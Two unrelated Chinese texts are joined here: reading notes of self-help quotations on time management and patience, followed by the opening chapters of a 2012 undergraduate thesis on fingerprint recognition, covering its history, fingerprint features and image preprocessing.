这种大师的境界，正是所谓的遥不可及，仰之弥高，望之弥艰，钻之亦不可得。知易行难啊。
基于过程的记录要比基于结果的记录只会更为详尽。
焦虑本身没有任何好处，只能带来负面影响
柳比歇夫肯定形成了一种特殊的时间感。在我们机体深处滴答滴答走着的生物表，在他身上已成为一种感觉兼知觉器官。
一度确实可能的“随心所欲”只不过是幼年时的真实，少年时幻想，成年时的苦恼，老年时的绝望。
把每天的时间开销记录下来，一方面可以培养自己的成就感，另外一方面可以避免轻易地原谅自己。每天晚上睡觉前，看着自己的本子，发现今天做了很多事儿的话，一定会很开心。
第一个良好的习惯： 
每天记录你的时间开销。如果你已经养成了这个习惯，那么，第二个良好的习惯就几乎是自然而然、合情合理的了。 
这个良好的习惯是： 
每天制作你的时间预算。
有意识地控制自己不要去做那些没有实际意义的事情——那是在浪费时间。
判断一件事情是否真的重要的标准只有一个：是否对你的目标（无论是长期，还是短期）的实现有益。
我从来都不相信人人都能成功之类的话，我顶多相信“其实人人原本都有可能成功”。
有一句话曾令我印象深刻，说，“失败只有一种，就是半途而废。”
我还是觉得，无论变化多块，计划总应该是有的。只不过，制定计划的时候，应该考虑到变化。
所谓千里之行始于足下，我们要做的事情是把每一步都走好，踩得足够踏实。至于千里之外的终点，既然看都看不到，就不用花时间去想了，想了也没用。用各种方法保持乐观就好——乐观是靠努力和挣扎才可以获得的经验。
无论计划简单还是复杂，缺乏切实的行动就注定会失败或者失效。

获得知识的基本途径
在“试错”这个手段的基础上，另外一个“聪明”一点的，也重要得多的获取知识的方式是“观察”。
信息爆炸使得我们处于人类历史上进步最为惊人的时代，日新月异这个词已经不够——用“分新秒异”都不过分。
不夸张地讲，今天的本科教育很大程度上干脆就是忘了本。
我个人的建议是去自学一门计算机编程语言。因为，关于计算机编程语言的文档，互联网上有最广泛最全面的资源。并且，优秀的资源往往是英文文档，所以，顺带还练习了英文阅读理解能力——想想吧，肯定不仅仅是一举两得。
然而，于学生来讲，更重要的是避开另外一个陷阱——不要因为讨厌老师而拒绝学习。这是最常见的现象之一。很多学生，仅仅因为讨厌英语老师，就开始失去学习英语的兴趣。按照正态分布的规律来看，在某一个阶段里，你必然只能遇到一两位好的老师，以及许多平庸的老师，和那么一两位甚至可能令人生厌的老师——相信我，他们也恨你，如你恨他们的话，每个人在这方面都非常敏感。
“无论如何，都不要也不应该用别人的错误惩罚自己，那么做不仅不对，并且愚蠢。”
他希望的是得到一个灵丹妙药，就着一杯凉白开灌下去之后就从此与众不同、焕然一新、重新做人。
见识越少的人越喜欢用自己所有的见识作为判断依据，并且完全不顾自己见识的局限，也不知道自己的见识有局限。
当然，直到今天也不得不时时挣扎——经常需要静下来独自一人“狠斗私字一闪念”。
不要抱怨——反正抱怨没用。抱怨最浪费时间，即便抱怨得正确。举个极端的例子。如果这个社会确实不公平，你要是抱怨一下当然没什么不对的。可是，抱怨不仅要花费时间，还会引发负面情绪，使你丧失斗志。同时，仅仅抱怨本身不会改变任何事实。与其浪费时间抱怨不公平，还不如花时间做些真正能够改变点什么的努力。

人人都能成功，你是否相信
在我们生存的这个世界里，资源稀缺是客观现实，也恰恰因此，人们的主观愿望肯定不可能全部被满足。
现代西方经济学缘起于亚当·斯密（AdamSmith，1723~1790）的学说，经过大卫·李嘉图（DavidRicardo，1772~1823 年）的补充，直至约翰·梅纳德·凯恩斯（JohnMaynardKeynes，1883~1946）才算是彻底正视资源的稀缺性，认为经济学的根本目的在于研究“如何运用有限的资源发挥最大的效用”
所谓成功，就是达成预期目标。
生活无法彻底回避比较，但是，事实上无需比较就可以获得的欢乐和幸福也确实太多太多，只不过常常被人们忽略。
如果一个人是正确的，他的世界就会是正确的。
富兰克·H·奈特（Frank H. Knight[插图]）有个著名的观点：“决定一个人富有的三个条件，一是出身，二是运气，三是努力，而这三者之中，努力是最微不足道的。”这是个严肃而重要、需要耗费大量时间与精力才能通过认真思考而理解并接受的道理：无论你多努力，你都很有可能完全没有机会做到富有富足——你有勇气接受这样的现实么？
……我知道我是有来历的。走在芸芸众生当中，这种感觉尤为强烈……
接受自己与别人没什么不同，至少没什么本质性上的不同，是心智正常成长的重要前提之一。所以，我常常这样告诉自己“你并不孤独。”
电影之所以精彩，有两个原因，首先是艺术加工，其次是时间段上的压缩——把一生的故事用一个半小时讲出来，不波澜起伏，惊险刺激才怪。
崔健是这样描述的：“为了爱情，歌曲算个屁；为了生命，爱情算个屁。”大实话往往没办法动听。其实，这并不是玩世不恭或者愤世嫉俗的说法，只不过是有勇气接受现实的人对生活的平静描述。
李宗盛在《凡人歌》说，“问你何时曾看见这世界为了人们改变？”听得我心惊胆颤。
爱默森（Ralph Waldo Emerson）说，“弱者相信运气，强者只究因果。”
另外，还有特别好玩的心理学现象。如果，你相信好运气，你的生活并不会因此就会变得更好或者更差。但是，反过来，如果你就是觉得自己是个倒霉蛋，那你的生活定会因此变得更糟。所以，尽管不应该盲目乐观，但一定不能悲观地生活。
当你没有准备好的时候，对你来讲，不存在任何机会。
“量力而行”是如此高难度的行为模式 
——

a.承认自己能力有限； 
  b.不怕在别人面前露怯； 
  c.敢于不去证明自己是“好人” 
  ……所以说，往往只有优秀的人才拥有有效的人脉。

生活的智慧就在于，集中精力改变那些能够改变的，而把那些不能改变的暂时忽略掉。专心打造自己，把自己打造成一个优秀的人，一个有用的人，一个独立的人，比什么都重要。
当你把时间花费到一个人身上的时候，相当于在他身上倾注了你生命的一段——哪管最终的结果如何，反正，那个人那件事都成了你生命中的一部分，不管最后你喜欢还是不喜欢。每个人的时间都是有限的。所以最终，“真正的好朋友”谁都只有几个而已。

最节省时间的方法：学习
学习就是人类所有能力的延伸——可以使人们拥有更多的能力
他们因为当初不肯花费十几二十几分钟而其后一生少做了很多事情，错过了很多机会，并且，一生只有一次却都没有过好……
合理的时间安排应该是这样的：简单的部分要迅速做完，而后把节约出来的时间投放在处理困难的部分上。
事实上，有氧运动大约20分钟之内，消耗的往往只是水分，30分钟之后才开始消耗脂肪。
反倒是资质在各方面都处于平均水平的人更不易自卑。
她的方法是在自己的语言中，把“优点”和“缺点”这两个词替换成“特点”

a.人们普遍相信他们在明天会拥有比今天更多的金钱； 
  b.人们普遍相信自己明天会有更多的时间。


万事皆可提前准备
所有的成功本质上都是一样的。先花上相当的时间和精力去锁定一个方向或者目标。确定它是现实的、可行的之后，运用心智的力量在这个方向上再投入更多的时间，再更多一点的时间。把时间当作朋友，一路前行。当时间陪伴你足够久的时候，你的耐心就能从它那里得到回报。
事实上，今天地球上所有控制巨大财富的家族都经历过“白手起家”的过程。在荒蛮的年代，“耐心”的作用可能被其他因素掩盖，但是，在比过往任何时代都高度文明的今天（尽管依然有很多地方令人失望），“耐心”已经成为最重要的、最有力量的因素。即便是古人都早就注意到“穷不过五服，富不过三代”——请注意前半句。
仔细注意就会发现，所有惊心动魄的精彩故事的主角都是充满了耐心的人，《基督山伯爵》中的爱德蒙·邓蒂斯，《肖申克的救赎》中的银行家安迪，《越狱》中的迈克尔·斯科菲尔德……这不是编故事的人胡说八道，而是，只有这样才最真实。
读苏东坡的《留侯论》中的文字，“古之所谓豪杰之士者，必有过人之节，人情有所不能忍者。匹夫见辱，拔剑而起，挺身而斗，此不足为勇也。天下有大勇者，卒然临之而不惊，无故加之而不怒，此其所挟持者甚大，而其志甚远也。”

补记
新东方动辄几百人甚至过千人的大课堂可谓全球独一无二。在大课堂上一讲就是六七年，期间学生数万，最大的经验就是：绝大多数学习上的成败与智商几乎没有任何关系，所有的失败都与且只与时间限制有关。
来自微信读书 









毕业设计完成于2012年，现阶段关于图像的东西都是走神经网络了，本文仅可以作为背景知识和简单的课程设计参考,本文另附一个MFC演示程序见文末下载链接
摘要： 指纹识别技术作为生物识别技术中最为具有应用前景的技术之一，近年来取得了长足的发展，并广泛应用于各种场合。由于指纹所具有的唯一性和不变性，以及指纹识别技术具有很高的可行性和实用性，指纹识别成为目前最流行、最可靠的个人身份认证技术之一。所以对指纹识别技术的研究具有重要的理论和实际意义。
指纹识别的一般性过程分为三步：指纹图像的预处理，指纹特征提取以及特征匹配。本设计采用Visual Studio 2008 MFC依照软件开发自顶向下，逐步细化的经典模式，按上述步骤完成开发工作，成功实现了基于BMP格式指纹图像的增强，二值化，细化，特征提取以及对比分析工作。完成了具有一般性的指纹对比分析系统。
关键词： 指纹识别；MFC；图像增强
Abstract: The fingerprint identification technology act as the most promising application of biometric technologies, has made considerable development in recent years and is widely used in various occasions. Due to the uniqueness and invariability of fingerprints，the fingerprint recognition becomes the most popular and reliable personal authentication technology. As a consequence, the study of fingerprint identification technology  is of great theoretical and practical significance.
Fingerprint identification can be divided into three periods: preprocessing of fingerprint images, feature extraction and feature matching In this design, we adopt the visual studio 2008 edition’s MFC, in accordance with software development which uses top-to-down process and the gradual refinement of the classic model , and successfully achieve  enhancement ,binarization ,thinning of fingerprint image, based on the BMP format. Through the whole process, we finally complete a general fingerprint contrast and analysis system
Key words: Fingerprint identification; MFC; enhancement

文章大纲第一章 绪论1.1 课题背景——指纹识别的发展历史1.2 指纹识别相对于其它识别技术的优势1.3 指纹识别技术在国内外的研究现状1.3.1 国外研究现状1.3.2 国内研究现状1.3.3 研究现状小结1.4 指纹识别的理论原理1.5 本论文的主要内容及工作第二章 指纹识别理论基础2.1 指纹学的基本知识及名称解释2.2 指纹的总体特征及分类2.3 指纹的局部特征2.4 指纹的基本性质2.5 指纹识别的基本原理第三章 指纹识别预处理和增强方法3.1 指纹图像预处理过程3.2 指纹图像分割概述3.3 均值方差法增强对比度3.4 Gabor滤波增强3.5 对指纹图像进行二值化处理3.6 指纹图像的细化3.7 预处理实验结果3.8 本章小结第四章 指纹特征的提取4.1 特征点的提取4.2 假特征点的去除第五章 指纹图像的匹配与实验结果5.1 指纹图像匹配方法简介5.2 本文的匹配方法5.3 实验结果第六章 展望6.1 系统结果及总结6.2 下一步工作6.3 展望全套资料下载链接参考文献

指纹的对比分析系统
第一章 绪论
1.1 课题背景——指纹识别的发展历史
指纹识别学是一门古老的学科，它是基于人体指纹特征的相对稳定与唯一这一统计学结果发展起来的。随着计算机和网络的迅速发展，人们对身份认证的准确性、安全性与实用性提出了更高的要求。在众多的生物识别技术中，指纹识别技术是发展最早、应用最广泛的一种。指纹识别技术充分利用了指纹的普遍性、唯一性和永久性的生物特征，已逐步取代了传统的基于标志和数字的识别方式，目前在网络、银行、金融、医疗和安检等行业均得到了广泛应用。本文对指纹识别系统的原理和基本过程进行了分析研究，重点研究了指纹图像预处理，细化，特征点比对等算法，并且设计实现了指纹对比分析系统，进行了模拟验证等工作。
随着现代社会经济的不断发展，越来越多的场合需要身份的确认手段。生物识别技术(Biometric Identification Technology)——是利用人体生物特征进行身份认证的一种技术。而指纹识别是生物识别技术中最成熟也是最可靠的识别技术之一
相关资料显示，中国是世界上最早应用指纹识别技术的国家。在西安半坡出土的距今六千多年的陶器上已发现了指纹的痕迹。从有据可查的资料中显示，我国对指纹的应用最早出现在中国古代秦朝以前，诸如南郑春秋商城遗址出土的春秋战国时代陶豆柄上的指印等。唐代时，以“按指为书”为代表的“指纹捺印”已经在文书、契约等民用场合被广泛采用。著名学者海因德尔（Heinai）在其权威的《指纹鉴定》著作中断定：“根据我国《周礼义疏》及《仪礼义疏》记载，中国第一个提到指纹鉴别个人的是唐代的作家贾公彦。他的作品大约写于公元650年，他是着重提到指纹是确定个人身份方法的世界上最早的作家。”自宋朝起，指纹则开始被用作刑事诉讼的物证。指纹在中国古代的借贷契约、买卖文凭、婚约休书、狱辞供状等方面得到广泛应用。
我国在广泛应用指、掌纹的漫长历史中，随着对外文化的交流，应用指纹的传统习惯传播到了世界上许多国家。中国也是世界公认的指纹发源地。

公元1788年，梅耶(J. Mayer)首次著文指出了至今仍然被承认的指纹的两个重要特性，一是没有人的指纹是完全相同的(唯一性)，另外一个是指纹的式样终身不会改变(稳定性)。
公元1823年，珀金杰（J. Purkinie）首次把指纹纹形分成了9类。
公元1880年，福尔茨（Henry Fauld）发表了指纹认证的论文，第一次科学地提出了指纹的个体性和唯一性。指纹唯一性的发现，使得指纹作为一种更为有效的鉴别方法而得到采用。
公元1889年，亨利（E. R. Henry）在总结前人研究成果的基础上，提出基于指纹细节特征识别（Minutia-Based）的理论，并提出了用指纹识别来进行确定罪犯身份的设想，从而奠定了现代指纹学的基础。直到一个世纪后的今天，采用基于Minutia- Based的指纹识别算法仍是主流。
公元1892年，英国的弗朗西斯·盖尔顿（Francis Galton）爵士对指纹进行了广泛的研究，写了《FingerPrint》一书，向世人介绍了用于单个指纹分类的细节特征，首次系统地阐述了指纹学。完善地确立了一整套指纹识别的方法，并且用于刑事侦察中对犯罪嫌疑人的甄别和鉴定。

到本世纪初，指纹学的研究基本成熟，这时的指纹鉴别，主要由指纹专家根据指纹知识凭经验判断。世界上许多国家都建立了指纹库，仅美国联邦调查局的指纹库中就存有二亿多张指纹卡。然而传统的指纹识别方法面临着从指纹库中人工查找、对比指纹卡速度慢、效率低、对人员要求高等问题。从二十世纪六十年代开始，随着计算机技术的发展，传统的指纹识别技术发生了重大变化。人们开始利用计算机来建立指纹识别系统。
1.2 指纹识别相对于其它识别技术的优势
目前有很多的生物测定技术可用于身份认证，包括虹膜识别技术、视网膜识别技术、面部识别、签名识别、声音识别技术、指纹识别等，具有安全、可靠的特点，其中指纹识别系统是目前研究最多、最有应用前景的生物识别系统。指纹识别技术的应用十分广泛，指纹因具有终生不变性及稳定性,而且不同人指纹相同的概率几乎为零,因此指纹自动识别系统被广泛应用于案例分析、商业活动中的身份鉴别等领域。指纹识别技术的发展得益于现代电子集成制造技术的进步和快速可靠的算法的研究。
表1-1 识别技术对比表一



类型
鉴别可靠度
可否运用一对一比照
可否运用一对多比照
传感器价格
尺寸




虹膜
很好
是
是
高
较大


视网膜
很好
是
是
高
较大


面部
一般
是
否
低
中等


签名
一般
是
否
低
较小


语音
一般
是
否
极低
非常小


基因
最好
是
否
极高
很大


指纹
很好
是
是
较低
非常小


表 1-2 识别技术对比表二

可以看出，在众多生物特征识别技术中，指纹识别是一种比较理想的基于生物特征的身份认证方式,随着科技的进步指纹识别技术在实际应用中表现除了越来越大的作用。在美国，9·11以后，三个相关的法案(爱国者法案、边境签证法案、航空安全法案)都要求必须采用生物识别技术作为法律实施保证。总体上来说，应用己经进入了以政府级应用为主的阶段，有着极其广阔的应用前景，其主要应用领域包括：

机场、旅客控制Airport S／Traye；
政府部门Government；
个人使用(门禁、考勤)Per Sonnel；
执法机构Law EnforCement：
消费者管理系统Consumer／Retail；
金融管理服务系统Fi nancial serriCeS；
计算机登陆系统Computer；
医疗保健系统HIPAA;

另外对生物识别(指纹识别)技术来说，被广泛应用意味着它能在影响亿万人的日常生活的各个地方使用。通过取代个人识别码和口令，生物识别（指纹识别）技术可以阻止非授权的“访问”，可以防止盗用ATM、蜂窝电话、智能卡、桌面PC、工作站及其计算机网络；在通过电话、网络进行的金融交易时进行身份认证；在建筑物或工作场所生物识别技术（指纹识别）可以取代钥匙、证件、图章等。生物识别(指纹识别)技术的飞速发展及其广泛应用将开创个人身份鉴别的新时代。指纹所具有的唯一性、不变性、易于获取、分类存储有规律等特性使其成为生物鉴定学中最为成熟的方式。
1.3 指纹识别技术在国内外的研究现状
指纹识别算法的研究方向主要分为：基于图像的识别算法和基于特征的识别算法。基于图像的识别算法认为，指纹图像的频域和空域信息可以用来唯一表示并识别不同的指纹。它是一种使用全局信息进行识别的方法，例如使用指纹图像的Fourier频谱来表示和识别指纹。这类算法的问题在于图像特征难以定义和匹配，因此算法的拒识率和误识率较高。基于特征的指纹识别算法是找到并比对指纹的特征。指纹特征的复杂度足以提供用于鉴别的足够特征。目前大多数的自动指纹识别系统使用的都是这类算法。指纹特征多种多样，有特征点、奇异点、域方向图、脊线数目，甚至脊线线型等。对应的匹配方法可以分为：基于点模式的匹配，基于脊线的匹配，基于纹理的匹配以及多种细节特征混合的匹配方法。
大多数基于特征的识别算法专注于脊线上的末梢点和分叉点，该方法根据各个特征点的位置和方向来表示和区分指纹，从而使指纹识别问题转化为判断两个特征点集间的最大相似度(最大重合度)的问题。提取该细节特征有多种方法：基于灰度指纹图像直接提取，基于二值图像的特征提取，基于细化图像的特征提取。
目前许多公司和研究所在指纹识别技术领域都取得了突破性的进展，推出许多指纹识别与传统IT技术完美结合的应用产品，这些产品已经被越来越多的用户所认可。
1.3.1 国外研究现状
在欧洲，现代的指纹匹配技术主要是16世纪后期产生。Henry Faulds在1880年，第一次科学的提出了指纹的两个重要特征：一是任何两个不同手指的指纹脊线的式样（ridge pattern）不同，二是指纹脊线的式样在人的一生中不会改变。这一发现奠定了现代指纹识别技术的理论基础，也使得指纹识别在罪犯鉴定中得到应用。Francis Galton对指纹进行深入研究，并于1888年引入了特征点的分类技术。1899年，Edward Henry学习了Galton的指纹科学，建立了著名的“Henry System”用于指纹分类。使用精准的指纹索引给专家指纹识别带来极大的便利。早在20世纪初期，司法部门己经正式采用指纹作为有效的身份标记，一些指纹识别机构建立了世界范围的罪犯指纹档案库。
1923年Purkinje首次对指纹进行了分类； 1960年，美国联邦调查局、英国内务部（Home offiee in the UK）和法国巴黎警察局联合开始投巨资研发指纹识别系统，并于1975年成功推出了第一个商业化系统，随后，各国研究机构和许多大公司开始指纹识别技术的研究和产品开发工作。国际上著名的指纹识别系统有：美国联邦调查局的AFIS系统，日本NEC公司的指纹鉴定系统，北美英弗公司的指纹鉴别系统等。目前，随着数字化、信息化社会对自动身份鉴别技术的要求的不断提高和AFIS在司法领域取得了巨大成功，随着计算机硬件性能的飞速提高和价格的不断降低，随着普通大众对指纹识别了解的深入和接受，指纹识别技术已经突破了司法、侦探领域进入民用领域，并取得了快速的发展。传统指纹识别算法（主要用于司法、刑侦领域）主要考虑降低拒识率，一般需要人工协助处理，而且存在误识率高、计算速度慢、资源消耗大等问题，并不适合于民用领域。同时，民用市场对指纹识别算法在自动化程度、拒识率和误识率、响应时间、资源消耗等方面也提出了更高的要求。
2006年初，澳大利亚成功发行世界上第一本生物识别护照。2007年11月，美国国土安全部宣布所有入境美国的非美国公民都要接受数字拍照及双手十指指纹扫描。指纹识别即将迎来迅速普及的发展时期。2009年，美国成功对指纹识别系统进行了更新的研究[2]。
1.3.2 国内研究现状
我国利用指纹识别身份的历史最早可以追溯到秦朝， 1903年,中国青岛市警察局首次应用汉堡式指纹法。此后我国相继开展了指纹的应用及研究,还曾建立过“指纹学会”。刘紫宛编写的《中华指纹法》一书是我国最早的指纹专著。全国解放后,我国对指纹研究一直比较重视。1955年编制了《中华人民共和国十指纹分析法》。这可以说是我国指纹的科学时期。
在国内，清华大学在80年代开始指纹识别的研究。中科院自动化所模式识别国家重点实验室自90年代以来，一直致力于“基于生物特征的身份鉴别”的研究，在指纹、虹膜、脸相识别等方面取得了很多的研究成果。北京大学视觉与听觉信息处理国家重点实验室先后承担了国家“七五”和“八五”，科技攻关项目，对指纹识别进行了长期的基础性研究，提出了一整套独创的理论和高效实用的算法。另外，自九十年代初以来，我国的北大方正集团、长春鸿达集团、西安青松集团等机构分别以所在地高校为技术依托，陆续开展了这方面的研究工作。总的来说，国内开展了很多研究，而且取得了很多成果。2002年，清华大学实现了在海量数据库上的人脸和指纹综合识别系统，在识别的过程采用的融合策略是先用人脸特征进行比对得到前n个候选，然后在这个范围内用指纹特征再进行比对。迄今为止，还没有综合生物特征的识别系统的产品问世，综合身份识别系统的研究有待于进一步发展。2009年中北大学信息与通信工程学院提出了一种基于傅立叶变换的指纹图像增强技术，大大提高了图像的清晰度。为后来的指纹识别技术作出了较大贡献。
与国外相比，我国在自动指纹识别技术的研究水平上还存在一定的差距。主要表现在：
(1)指纹录入设备的质量还不太过关：
(2)自动指纹识别算法研究水平还有待提高，在应用上的表现为产品适应性和易用性较差，对干、湿一些的指纹往往不能正确区别，对指纹录入时的旋转、平移比较敏感。
1.3.3 研究现状小结
现在国内外指纹识别大都采用基于细节特征点的指纹识别技术，即采用基于图像处理的指纹识别算法，其中比较有代表性的有两种。一种是基于方向滤波增强，并在指纹细化图上提取特征点的算法，另一种是直接从指纹灰度图上提取特征点的算法。指纹识别作为一种热门的生物识别技术受到越来越多人的关注，国内外许多机构和学者都采用了很多不同的算法对指纹图像进行预处理和匹配。但有些算法会由于指纹图像的噪音、皮肤弹性引起的非线性形变等多方面因素，导致在识别过程中出现误差，影响识别率等。
当下指纹识别技术已经越来越成熟，其应用日益普遍。除了刑事侦查以外，民用方面，如指纹门禁系统，指纹考勤系统，银行指纹身份认证系统等。社会各个方面对指纹识别系统有很大的需求。
1.4 指纹识别的理论原理
现代指纹识别源于16世纪后期。苏格兰医生Henry Fauld于1880年首次在英国《Nature》发表论文称，人的指纹各不相同且恒久不变，并可以利用现场指纹来鉴定罪犯。
相当数量的研究者在长期科学研究中发现两个人指纹相同的概率极小。单个手指指纹的概率小于七十亿分之一	。其次一个人指纹可以保持终生不变。美国最早于1963年首先开始指纹识别技术相关软件的研制。
当然指纹识别是一个复杂的过程。与人工处理不同，自动指纹识别技术并不直接储存指纹图像。多年来各个公司及其研究机构产生了许多数字化算法。但指纹识别算法的本质问题都归结为，在指纹图像上找到并对比指纹的特征。通过计算机模糊比较的办法，计算出它们的相似程度，并最终得到两个指纹的匹配结果。
实际应用中，人类指纹的纹形特征根据其形态的不同通常可以分为“弓型、箕型、斗型”三大类型，以及“孤形、帐形、正箕形、反箕形、环形、螺形、囊形、双箕形和杂形”等9种形态。根据上述模型特征比在计算机中建立数学模型进行数字匹配便是指纹识别的一般性原理。
1.5 本论文的主要内容及工作
本文以研究指纹识别中指纹图像分割、细化、特征提取、匹配等若干问题为研究主体，针对指纹识别技术中分割、细化和匹配进行了仿真和修正。其中分割部分采用了方差均值的方法，细化选取了一种伪特征较少的模板，匹配时以分叉点和端点信息进行匹配。具体的章节和各章的内容安排如下：
第一章：介绍了研究背景，对现在发展和应用的各种生物识别技术进行了概
述，尤其重点阐述了其中指纹识别技术的发展、应用、研究概况、市场前景和存
在的难题以及研究方向。同时，说明了本论文的研究目的及意义。
第二章：为后续的研究工作奠定基础，本章介绍了指纹学基础知识：名词解释，指纹的分类，以及指纹识别的基本原理。
第三章：指纹识别工作中最重要的工作，是对已经采集了的指纹图片进行的一系列预处理工作，包括增强，二值化，细化等。本章主要的介绍了指纹图像预处理的流程和方法，并给出了仿真得到的结果。
第四章：介绍了指纹图像细化的方法并仿真得到结果。主要介绍了指纹图像细化后的特征提取，需要哪些特征，去除哪些伪特征，以方便和正确地进行匹配工作。
第五章：介绍了指纹图像匹配的概念、匹配问题的困难所在和常用方法，给出了一种修改基础上验证用的匹配方法。
第六章：总结本文所取得的一些研究成果，并对课题发展进行了展望。

第二章 指纹识别理论基础
2.1 指纹学的基本知识及名称解释
指纹：手指第一节(手指尖一节)指头表面乳突纹线。
指印：手指第一节乳突线与承受客体接触时留下的印痕。
脊线：是手指上的特殊的皮肤花纹的隆线。
谷线：两个脊线之间低陷的部分。
细节特征：指纹中出现的各种特征。而根据其出现的概率及在处理过程中的
稳定性，我们最常采用的就是脊线端点和分叉点，如图。

图2-1 两种基本的指纹细节特征
2.2 指纹的总体特征及分类
总体特征是指那些用人眼直接就可以观察到的特征，包括基本纹路图案：环型（loop），弓型（arch），螺旋型（whorl）。其他的指纹图案都基于这三种基本图案。
指纹的脊纹形式是适应之间的球状表面和半圆形顶端以及横行的指间屈基线生长的，除少数弓形纹之外，绝大多数是箕、斗型纹（约占95%），（三种纹形的大致分布概率如表2-1）
表2-1 纹形的大致分布概率



基本纹型
弓型
箕型
斗型




分布概率
5%
60%
35%


纹型是指纹的基本分类，是按中心花纹和三角的基本形态划分的。纹形从属于型，以中心线的形状定名。按我国是指纹分析法，指纹分三大类型（如图2-2），五大种形态。可见，型与形是类与种的关系。

箕型             斗型               弓型
图2-2 指纹的纹形
进一步的细化分类可将指纹分为六种主要的类型：拱形(arch)、帐型(tended arch)、左箕型(1eft loop)、右箕型(right loop)、双箕型(double whorl)和斗型(whorl)。图为上述六种类型的指纹图示。

图2-3 指纹细化分类
2.3 指纹的局部特征
局部特征是指指纹上的节点的特征，这些具有某种特征的节点称为特征点。两枚指纹经常会具有相同的总体特征，但它们的局部特征—特征点（Minutia），却不可能完全相同。
指纹纹路并不是连续的、平滑笔直的，而是经常出现中断、分叉或打折。这些断点、分叉点和转折点就称为"特征点"。就是这些特征点提供了指纹唯一性的确认信息。特征点的分类有以下几种(如图2-4),最典型的是端点和分叉点。

图2-4指纹特征示意图
很多研究者试图解决指纹分类问题，其核心的问题就是指纹局部与整体特征的定义问题，至今分类算法的种类繁多，所以不同识别系统普遍存在误识率较高的问题。如何提高指纹分类的准确率在指纹识别研究中是一个较关键的问题。
2.4 指纹的基本性质

确定性：指纹纹线的轮廓(纹型)和细节特征是基本不变的。从胚胎学
角度考察，胎儿3—4个月即产生了指纹，至6个月左右的胎儿就形成了完整的
指纹，出生后随着年龄的增长，纹线会变粗，花纹的面积会增大，但到了成年以
后，这些变化即无显著表现，而花纹的类型结构、细节特征的总体布局、脊线的
总数目等方面，自胚胎六个月到出生至死亡腐败之前，始终是无明显变化的，这
就充分地表明了指纹的确定性
唯一性：由于指纹脊线的连接关系千变万化，因此，即使两个不同的指纹
有着相同的轮廓和相同数量的细节特征，它们的细节位置也是不可能完全相的。
可分类性：指纹的纹型，中心点和三角点之间的脊线数，以及细节特征
间的关系，都可作为分类的依据。
触物留痕：从严格定义上讲，自动指纹识别应该为自动“指印”识别。
指纹接触物体后留下的痕迹即为指印。正是因为这些性质，指纹被国内外许多专家、学者称为“证据之首”。

一切指纹识别系统，都是基于以上这些性质，从而进行身份的鉴别和确认的。
2.5 指纹识别的基本原理
指纹识别技术主要涉及四个功能：读取指纹图像、提取特征、保存数据和比对。通过指纹读取设备读取到人体指纹的图像，然后要对原始图像进行初步的处理，使之更清晰，再通过指纹辨识软件建立指纹的特征数据。软件从指纹上找到被称为“节点”（minutiae）的数据点，即指纹纹路的分叉、终止或打圈处的坐标位置，这些点同时具有七种以上的唯一性特征。通常手指上平均具有70个节点，所以这种方法会产生大约490个数据。这些数据，通常称为模板。通过计算机模糊比较的方法，把两个指纹的模板进行比较，计算出它们的相似程度，最终得到两个指纹的匹配结果。
其一般性过程如下图所示：

图2-5 指纹识别的一般性过程

第三章 指纹识别预处理和增强方法
在图像形成，传输或变换的过程中，由于受到其它客观因素诸如系统噪声、曝光不足或过量、相对运动等影响，获取图像往往会与原始图像之间产生某种差异(称为降质或退化)。退化后的图像通常模糊不清或者经过机器提取的信息量减少甚至错误，这些在实际应用中，具体表现有：
1.指纹模糊不清造成指纹纹线间的粘连、模糊或断裂,会导致产生虚假的指
纹细节特征点。
2.遗漏或忽略了正确的细节特征点。
3.在有关描述细节特征点的位置和方向等属性时产生严重失真。
因此指纹图像质量的高低直接关系到细节特征点提取的有效性和可信性影响系统在匹配时的拒认率和误识率，从而最终影响整个系统识别的结果。
由此可知，在进行指纹分类和细节特征匹配之前一定要先对采集到的指纹图像进行针对性的预处理。预处理是指纹自动识别系统中的最重要的一步,它的好坏直接影响着指纹识别的效果。图像增强技术正是在此意义上提出的，目的就是为了改善图像的质量。
3.1 指纹图像预处理过程
图像增强尚没有统一的理论方法，常用的图像增强技术有直方图修改、图像平滑滤波、图像锐化等。图像增强技术主要分为两类：频域增强法和空域增强法．频域增强法就是在图像的某种变换域中(通常是频率域内)对图像的变换值进行某种运算处理，然后变换回空间域。空域增强法是直接针对图像中的像素，对图像的灰度进行处理。空域法属于直接增强的方法，它包括扩展对比度的灰度变换和直方图变换、消除噪声的平滑法和增强边缘的锐化法。
指纹图像与处理的主要流程如下图所示：

图3-1 指纹图像预处理的主要流程
指纹图像预处理的过程核心就是人们通常所说的图像的滤波，既在图像增强前使用一些简单的图像处理手段对图像进行初加工。通常使用的预处理方法包括：
1.感性区域的分割，计算出指纹图像的边界，进行感性区域（ROI Region of Interest）的分割。
2.灰度均衡化：用以消除或减轻同一图像不同区域之间或者不同图像之间对比度的差异
3.方向场的计算：计算出指纹图像的方向场，这个步骤是指纹的滤波和增强所不可缺少的一个环节。
4.低通滤波，利用简单的低通滤波器去除图像中存在的椒盐，高斯等噪声。
上述方法将在后续章节中逐一介绍。
3.2 指纹图像分割概述
在指纹识别系统中，指纹图像分割是图像预处理的一部分。指纹分割的最基本的依据是图像某些特征和特征集合。图像特征是指纹图像的固有属性,如灰度值,邻域关系,纹线的扭曲程度等。特征集合则是几种的结合。通过提取图像特征,可将原始图像映射到特征空间,使图像特征在特征空间中呈现一定的分布。因此根据以上的的灰度值领域关系，纹线的扭曲程度，指纹图像分割大致分为三类：基于像素的图像分割，基于块特征的图像分割以及基于全局的图像分割。
基于全局的图像分割则是根据情况特别是某些特殊场合的利用，如残缺指纹。全局的图像分割可以是人工选定几个特定点后再根据全局的特点来处理，此法也可运用于匹配。基于全局的指纹识别仍处于实验室探索阶段,应用领域中尚不广泛。
3.3 均值方差法增强对比度
在图像分割概述中，已经提到基于块特征的指纹图像分割。在这部分将重点介绍均值法差法的计算方法和在仿真中的运用。
该算法基于背景区灰度方差小，而指纹区方差大的思想，将指纹图像分成块，计算每一块的方差，如果该块的方差小于阈值为背景，否则为前景。具体步骤分以下三步：
(1)将低频图分成M×M大小的无重叠方块，方块的大小以一谷一脊为宜。
(2)计算出每一块的均值和方差。
设指纹图像I的大小为H×L，I(i,j)为像素点(i,j)的灰度，AVE和VAR分别为原指纹图像的均值和方差，AVE和VAR可以通过公式(3.1)和(3.2)计算得到。



公式
编号





（3.1）



（3.2）


(3)如果计算得到的方差几乎接近于0就认为是背景，对于方差不为零的区域在进行阈值分割算法，这种算法主要是根据计算得到的方差来决定其是否为背景区。
